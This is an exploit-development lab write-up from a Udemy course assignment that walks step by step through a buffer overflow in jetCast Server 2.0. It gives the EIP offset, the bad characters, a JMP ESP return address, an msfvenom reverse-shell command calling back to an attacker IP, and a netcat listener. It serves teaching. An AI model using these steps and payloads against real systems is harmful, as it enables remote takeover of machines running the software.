# JetAudio-jetCast-Server-2.0-Buffer-Overflow
This is a write-up for the first assignment of the [Hands-On Fuzzing and Exploit Development](https://www.udemy.com/course/hands-on-exploit-development/) course by Uday Mittal on Udemy.

The methods demonstrated in this write-up are for educational purposes only.

## Recreating Environment
For testing purposes, the environment I used is as follows:
- [Virtualbox 6.0](https://www.virtualbox.org/wiki/Downloads)
- Windows 7 SP1 x86
- [Kali Linux 2020.2](https://www.kali.org/downloads/)
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- [Mona library](https://github.com/corelan/mona)

## Information Gathering
The assignment was to use the jetAudio jetCast Server 2.0 to find a buffer overflow and get a shell on the attacking machine. To start, I searched for the program and came across the following Exploit-DB page: https://www.exploit-db.com/exploits/46819

The Exploit-DB page also contained a download for the program which I used to download and install it on my Windows 7 machine. At this point I was ready to recreate the POC and move forward from there.

## Writing a Fuzzer
In order to make sure the POC worked, I rewrote it using Python:
```
buf = "A" * 5000
f = open('buffer.txt', 'w')
f.write(buf)
f.close()
```
I then sent the buffer.txt file over to my Windows machine. I launched Immunity Debugger, opened the jetCast Server, and pressed F9 to run the program. Following the instructions the POC gave, I opened the Config menu and copy and pasted in the 5000 A's. I clicked OK and then Start. The program promptly crashed and I received an "Access violation" error. Looking at the registers we can see that EIP has been overwritten by hex 41 (A) characters. Looks like the POC is working as it should.

## Finding the EIP offset
Now that we know there is a buffer overflow, we need to find where in the buffer of A's the EIP offset is. We need to do this so that we can know how large our buffer needs to be in order to place a return address into EIP later on. 

To find the offset, we can create a non-repeating string of characters using the msf-pattern_create tool, specifying a length of 5000 characters:
```
msf-pattern_offset -l 5000
```
We can take this output and place it into our POC script. Following the same procedure as the first step, we run the script, transfer the output file to the Windows machine, open jetCast in Immunity, and place the non-repeating string into the log directory location. This time when the program crashes, we see that the EIP register is filled with "72413772", the hex equivalent of "rA7r". To find where this set of characters is in the pattern we created, we can use the following:
```
msf-pattern_offset -q 72413772
[*] Exact match at offset 532
```
We now know that the EIP offset will be at 532, so we can modify our code to begin controlling the EIP register.

## Controlling EIP
To make sure the offset found is correct, we rewrite the code to now include three variables: offset, eip, and buffer. The offset variable will be an offset of 532 bytes, the eip variable will (eventually) contain the address to jump to, and the buffer variable is used to find where ESP might be in relation to EIP.
```
offset = "A" * 532
eip = "B" * 4
buffer = "C" * 32
payload = offset + eip + buffer

f = open('offset.txt', 'w')
f.write(payload)
f.close()
```
We again run the code, transfer to Windows, launch Immunity and jetCast, and input the string. After doing so, we see that the program once again crashed and that EIP is filled with our 4 "B" characters. Perfect!

Next we look at ESP to see where ESP is currently pointing to. We can right-click the ESP address in the upper-right window in Immunity (the Registers windows) and choose "Follow in Dump". This will move the lower-left window to the address currently stored in ESP. We can see that it begins immediately after our EIP register, so this is good news as it will make it a little easier to place our shellcode later on.

At this point, we could also test to make sure we can create enough space for our shellcode. To do this, just continue to increase the "buffer" variable. On average, shellcode is within 350-400 bytes long, so we can set a buffer variable equal to 400 and make sure it doesn't get cut off. Luckily this program will create enough space for our shellcode in this location so we do not need to do any further testing.

## Checking For Bad Characters
The next step before we find a return address is to check for bad characters. Bad characters will be any hex value between \x00 and \xff that would cause the string to terminate. The reason for checking for this is to make sure that our return address and shellcode do not contain any bad characters. If they did, it would cause the program to stop execution when it reached the bad character and our exploit wouldn't work. In order to test for this, we simply create a string with all characters from "\x01" through "\xFF" and place it into the ESP register.

**NOTE:** To be thorough, we can add \x00 in the list as well. However, this is almost always going to be a bad character as it represents a null-byte which will terminate the string. Every time I have tested it, it has been a bad character so I generally will not test for it. 

After updating our code, we continue with the same process as before of causing a crash. This time, we will right-click the address of ESP in the Register window and choose "Follow in Dump" again. What we want to look for is if the string of hex characters cuts off at all. During the first test, we see that the string ends at "\x0C". This indicates to us that the program is terminating the string at the "\x0D" character. This is a common bad character as the ASCII equivalent is "Carriage Return".

In order to continue testing, we simply remove the "\x0D" character from our list in our code and repeat the steps until all bad characters are found. In this case, we are a bit lucky as it appears that "\x0D" is the only bad character (as well as "\x00"). We can now move to looking for a valid return address.

## Finding a Return Address
To find a valid return address, we will look for a JMP ESP instruction in the code that does not contain any of the bad characters we found in its address. To start, we open the jetCast Server in Immunity and run the program using F9. In the bottom text input, we can use the command:
```
!mona jmp -r esp
```
This will search the loaded modules for a JMP ESP instruction. We were able to find a JMP ESP instruction located at 0x77ef9d55. This address doesn't contain any bad characters and the DLL does not have ASLR or other security features turned on, so it should be good to use.

**NOTE:** If after running the Mona command, Immunity still displays the CPU window (the main window with the four smaller windows), simply go to the top menu bar and choose Window -> Log Data.

To test that our address is going to work, we will simply replace it in our POC code and then set a breakpoint in Immunity to stop program execution if that address is reached.

Our code should now look like:
```
offset = "A" * 532
eip = "\x55\x9d\xef\x77"
buffer = "C" * 32

payload = offset + eip + buffer
```

Note that we enter the address using little endian. I won't try to explain endianness, but essentially it just means that we need to reverse the order of the characters in our address. Since each byte contains two characters, we group the address by two characters and swap the order.

Original (big endian): 77 ef 9d 55

New (little endian) 55 9d ef 77

We then wrap this with "\x" in our string to signal the characters as hex to Python.

Again, we run the code, transfer the output file to Windows, and open jetCast with Immunity. We run the program but before we enter the new string of characters, we must set a breakpoint. To do this, in the upper-left window, right-click and choose "Go to -> Expression" and enter the address 0x77ef9d55. This will take us to our JMP ESP instruction. Make sure the address is selected and press F2 to set a breakpoint (can also do this by right-clicking the address and choosing "Breakpoint -> Toggle").

Now that our breakpoint is set at our return address, we will enter our string into the Log Directory input and click start. This time, Immunity should pause execution of our program at the breakpoint we set. We can verify this by checking if EIP is equal to our JMP ESP address. After verifying that it is, follow the ESP address in the dump window to make sure it is still set to our buffer. As it is, we will press F7 to make the program execute one step, which in this case will cause it to execute the JMP ESP instruction.

After doing this, we see that the execution flow is now pointing to the start of our ESP buffer. This is exactly what we want! Now we can move on to generating shellcode to place into our ESP register.

**NOTE:** Finding a valid return address can sometimes take a few tries. On occasion, I've instead used:
```
!mona find -s "\xff\xe4"
```
which is the hex values for a JMP ESP instruction. Sometimes this returns more or less instructions than other commands.

We can also narrow our search by looking in specific modules. For instance, if we want to only search loaded modules with no security features enabled, we can use
```
!mona modules
```
to receive a list of all loaded modules for the program, find one that suits our needs, and then use a command such as:
```
!mona find -s "\xff\xe4" -m "C:\Program Files\JetCast Server\MSVCP60.dll"
```
(The module listed above is an example. It is the module that the JMP ESP address we will use is located in).

## Generating shellcode
Now that we have verified we can control the EIP and ESP registers, we can move onto generating shellcode. There are quite a number of ways to do this, but I used msfvenom to do so:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.2.2.5 LPORT=4444 -b "\x00\x0d" -f py -v shellcode
```
Breakdown:
- -p windows/shell_reverse_tcp: will use this as the payload
- LHOST=10.2.2.5: the IP address of the attacking/listening machine to catch the reverse shell
- LPORT=4444: the port the attacking/listening machine will use
- -b "\x00\x0d": will tell msfvenom to encode the shellcode in such a way that these characters will not be used since they are bad characters
- -f py: will format the output for Python
- -v shellcode: will set the variable name to "shellcode"

After msfvenom generates the shellcode, we can copy and paste it into our code where the ESP variable was.

However, it is also good practice to prepend the shellcode with NOP instructions. This will allow the shellcode to still execute in the event that our shellcode doesn't begin at exactly where we want it to for some reason. The NOP (No Operation)instructions will tell the program to simply move to the next instruction. This can be important because if the program were to shift our shellcode off by one byte, then it would not work. Realistically, in this situation, we are probably fine without a NOP sled, but it is good practice and would be needed in other situations.

Our code should now look like:
```
offset = "A" * 532
eip = "\x55\x9d\xef\x77"
nopSled = "\x90" * 8

shellcode = ...

payload = offset + eip + nopSled + shellcode

f = open('exploit.txt', 'w')
f.write(payload)
f.close()
```
Once more, run the script and transfer the output file over to Windows.

## Getting a Shell
Before we send the exploit string to the program, we need to set up a listener on our attacking machine. To do so, we can simply use netcat:
```
nc -nvlp 4444
```

This time in Windows, we won't need to use Immunity to start the program. Just run the program normally, copy the exploit string into the Log Directory input, and click Start. When we check back on our attacking machine we should have a shell to the Windows machine. Success!
